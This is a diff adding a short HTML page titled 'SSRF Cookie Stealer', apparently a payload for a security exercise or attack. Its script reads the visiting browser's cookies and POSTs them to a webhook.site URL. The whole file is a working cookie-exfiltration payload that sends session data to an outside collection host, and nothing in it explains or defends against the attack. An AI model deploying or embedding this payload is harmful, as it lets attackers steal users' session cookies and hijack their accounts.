@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Cookie Stealer</title>
+</head>
+<body>
+    <h1>Stealing cookies...</h1>
+    <script>
+        // Grab all cookies
+        const cookies = document.cookie;
+        
+        // Send cookies to Webhook.site
+        fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'cookies=' + encodeURIComponent(cookies)
+        });
+    </script>
+</body>
+</html>
